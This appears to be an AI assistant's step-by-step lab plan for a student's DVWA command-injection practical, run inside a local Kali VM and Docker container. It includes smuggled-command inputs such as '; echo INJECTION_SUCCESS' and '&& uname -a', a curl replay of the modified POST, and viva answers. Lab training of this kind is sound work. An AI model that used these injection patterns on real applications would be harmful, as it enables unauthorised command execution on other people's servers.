@@ -1,0 +1,138 @@
+Nice — here’s a **clean, no-fluff plan** for exactly what to do tomorrow in the lab for **Program 4 — Command Injection (DVWA)**. Copy this into a sheet or phone note and follow the steps. I’ve included **every click/command**, **what to expect**, and two one-line viva replies. Do everything **inside your Kali VM**.
+
+---
+
+# Before you start (1 min)
+
+* Boot Kali VM in VirtualBox.
+* Open a terminal and a browser inside the VM.
+
+---
+
+# Start DVWA (5–7 min)
+
+1. Open terminal → run:
+
+   ```bash
+   sudo apt update
+   sudo apt install -y docker.io
+   sudo systemctl enable --now docker
+   # optional (logout+login after running this)
+   sudo usermod -aG docker $USER
+   sudo docker run --rm -d --name dvwa -p 8080:80 vulnerables/web-dvwa
+   sudo docker ps
+   ```
+
+   **Expect:** `docker ps` shows a container named `dvwa` with `0.0.0.0:8080->80/tcp`.
+2. Open browser in VM → go to:
+
+   ```
+   http://127.0.0.1:8080/
+   ```
+3. Click **Create/Reset DB** → wait for success message.
+4. Login: **Username:** `admin`  **Password:** `password`
+5. DVWA → **DVWA Security** → set **LOW** and Save.
+
+---
+
+# Command Injection practical (10–12 min)
+
+1. From DVWA menu: **Vulnerabilities → Command Injection**.
+2. **Baseline test**:
+
+   * In input box type: `127.0.0.1` → Click **Submit**.
+   * **Expected:** ping output appears on the page (ICMP replies).
+3. **Proof-of-concept injections** (enter each, Submit, observe):
+
+   * `127.0.0.1; echo INJECTION_SUCCESS`
+     → Look for `INJECTION_SUCCESS` in output.
+   * `127.0.0.1 && uname -a`
+     → Look for system info (kernel/OS).
+   * `127.0.0.1; ping -c 2 127.0.0.1`
+     → Short ping; prevents infinite ping.
+4. **Notes on operators**:
+
+   * `;` runs next command regardless.
+   * `&&` runs next only if previous succeeded.
+   * `||` runs next only if previous failed.
+
+---
+
+# Capture & replay request (DevTools → cURL) (8–10 min)
+
+1. Open **DevTools** in the browser (Ctrl+Shift+I) → **Network** tab.
+2. Submit the form once (e.g., with `127.0.0.1`).
+3. Find the POST request (likely `POST /vulnerabilities/exec/`) → right-click → **Copy → Copy as cURL**.
+4. Paste copied cURL into a terminal editor. Modify only the POST data:
+
+   * Change `--data-raw 'ip=127.0.0.1&Submit=Submit'`
+     to
+     `--data-raw 'ip=127.0.0.1; echo INJECTION_SUCCESS&Submit=Submit'`
+5. Run the modified curl in terminal:
+
+   ```bash
+   # example run (paste your copied and modified curl)
+   curl 'http://127.0.0.1:8080/vulnerabilities/exec/' -X POST \
+     -H 'Cookie: PHPSESSID=...; security=low' \
+     --data-raw 'ip=127.0.0.1; echo INJECTION_SUCCESS&Submit=Submit'
+   ```
+
+   **Expect:** terminal prints HTML that includes `INJECTION_SUCCESS`.
+6. Quick grep check:
+
+   ```bash
+   <your-curl-command> 2>/dev/null | grep -C2 INJECTION_SUCCESS || echo "marker not found"
+   ```
+
+---
+
+# Forensic proof — check server logs (3–4 min)
+
+1. In host terminal:
+
+   ```bash
+   sudo docker exec -it dvwa bash -lc "tail -n 120 /var/log/apache2/access.log"
+   ```
+2. Look for an entry for `/vulnerabilities/exec/` at the time you ran tests. This proves the request reached the server.
+
+---
+
+# Cleanup (1 min)
+
+* Stop DVWA container (if started with sudo):
+
+  ```bash
+  sudo docker stop dvwa
+  ```
+* Or let it auto-remove if you used `--rm` and it exited.
+
+---
+
+# Quick troubleshooting
+
+* **No page at :8080?** `sudo docker ps` — container not running → `sudo docker logs dvwa`.
+* **Marker not shown in curl output?** Ensure `Cookie` header (session + `security=low`) is present.
+* **Infinite ping?** Use `ping -c 2` to limit packets.
+
+---
+
+# What to say in viva (2–3 lines)
+
+* “I launched DVWA in Docker, set security to LOW, used the Command Injection page, and showed `; echo INJECTION_SUCCESS` executed server-side — I captured the exact request using DevTools, modified the POST body, replayed it with `curl`, and confirmed the injected output and an Apache log entry inside the container.”
+* “`;` chains commands; `&&` runs next only on success; `||` runs next only on failure.”
+
+---
+
+# One-line checklist to follow tomorrow
+
+1. Start Kali VM → Terminal + Browser.
+2. Start DVWA container (`docker run ... -p 8080:80`).
+3. Browser: `http://127.0.0.1:8080/` → Create/Reset DB → login `admin/password` → set LOW.
+4. Vulnerabilities → Command Injection → test baseline + 3 POC injections.
+5. DevTools: Copy as cURL → modify POST to include `; echo INJECTION_SUCCESS` → run curl → grep for marker.
+6. Check Apache access.log inside container.
+7. Stop container.
+
+---
+
+If you want, I can format this into a **one-page printable cheatsheet** (PDF or plain text) you can take to the lab — say “cheatsheet” and I’ll output it immediately.
